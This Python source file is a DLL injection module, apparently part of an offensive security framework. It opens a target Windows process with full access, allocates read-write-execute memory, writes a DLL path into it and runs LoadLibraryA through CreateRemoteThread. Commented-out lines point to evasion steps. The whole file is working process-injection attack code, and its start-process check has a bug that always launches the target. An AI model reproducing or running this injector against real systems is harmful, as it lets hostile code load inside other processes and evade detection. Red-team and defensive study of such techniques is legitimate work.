
#import ctypes
#import ctypes.wintypes as wt
#import sys
#import time
import os

from utils.helper import nstate as nstate
from utils.helper import CheckFile, GetFileInfo
from utils.windef import *
from utils.winconst import *

CATEGORY = 'inject'

def register_arguments(parser):
            parser.add_argument('-i', '--input', type=str, required=True, help='Input dll to inject')
            parser.add_argument('-p', '--process', required=True, help='Process to inject into')
            parser.add_argument('-s', '--start-process', action='store_true', required=False, default=False, help='If set, the process will be started')

class module:
    import wmi, threading
    from time import sleep
    Author = 'psycore8'
    Description = 'DLL Injection Module'
    Version = '0.1.1'
    DisplayName = 'DLL-INJECTION'
    mem = any
    data_bytes = bytes
    data_size = 0
    hash = ''
    pid = 0

    def __init__(self, input_file, target_process, start_process):
            self.input_file: str = input_file
            self.target_process = target_process
            self.start_process = start_process

    def msg(self, message_type, ErrorExit=False):
        messages = {
            'pre.head'       : f'{nstate.FormatModuleHeader(self.DisplayName, self.Version)}\n',
            'error.input'    : f'{nstate.s_fail} File {self.input_file} not found or cannot be opened.',
            'error.inject'   : f'{nstate.s_fail} Error during injection process',    
            'post.done'      : f'{nstate.s_ok} DONE!',
            'proc.input_ok'  : f'{nstate.s_ok} File {self.input_file} loaded\n{nstate.s_ok} Size of shellcode {self.data_size} bytes\n{nstate.s_ok} Hash: {self.hash}',
            'proc.input_try' : f'{nstate.s_note} Try to open dll file {self.input_file}',
           # 'proc.try'       : f'{nstate.s_note} Try to execute s',
            'inj.run'        : f'{nstate.s_note} starting {self.target_process}',
            'inj.pid'        : f'{nstate.s_note} {self.target_process} process id: {self.pid}',
            'inj.handle'     : f'{nstate.s_note} Opened a Handle to the process',
            'inj.alloc'      : f'{nstate.s_note} Allocated Memory at 0x{self.mem}',
            'inj.write'      : f'{nstate.s_note} Write to memory',
            #'inj.nacc'       : f'{nstate.s_note} VirtualProtectEx: PAGE_NO_ACCESS',
            #'inj.susp'       : f'{nstate.s_note} CreateRemoteThread: START_SUSPENDED',
            'inj.inj_ok'     : f'{nstate.s_ok} Injected {self.input_file} into {self.target_process}',
            #'inj.rwe'        : f'{nstate.s_note} VirtualProtectEx: PAGE_READWRITE_EXECUTE',
            #'inj.rest'       : f'{nstate.s_note} ResumeThread',
            #'inj.resume'     : f'{nstate.s_ok} Process resumed'

        }
        print(messages.get(message_type, f'{message_type} - this message type is unknown'))
        if ErrorExit:
            exit()

    def Start_Process(self):
        self.msg('inj.run')
        os.system(self.target_process)

    def get_proc_id(self):
        processes = self.wmi.WMI().Win32_Process(name=self.target_process)
        self.pid = processes[0].ProcessId
        self.msg('inj.pid')
        return int(self.pid)
    
    def start_injection(self):
        if self.Start_Process:
            s = self.threading.Thread(target=self.Start_Process)
            s.start()
            self.sleep(3)
        self.pid = self.get_proc_id()
        ph = OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
        if ph: self.msg('inj.handle')
        mem = VirtualAllocEx(ph, None, len(self.data_bytes)+1, MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)
        if mem:
             self.mem = mem
             self.msg('inj.alloc')
        self.msg('inj.write')
        WriteProcessMemory(ph, mem, self.data_bytes, len(self.data_bytes)+1, 0)
        th = CreateRemoteThread(ph, None, 0, LoadLibraryA, mem, 0, None)
        if th: self.msg('inj.inj_ok')
        else:  self.msg('error.inject', True)
        CloseHandle(ph)
        CloseHandle(th)

    def process(self):
          self.msg('pre.head')
          self.msg('proc.input_try')
          if CheckFile(self.input_file):
            self.data_size, self.hash = GetFileInfo(self.input_file)
            self.msg('proc.input_ok')
            dll_file = os.path.abspath(self.input_file)
            self.data_bytes = dll_file.encode('utf-8')
            self.start_injection()
            self.msg('post.done')
          else:
            self.msg('error.input', True)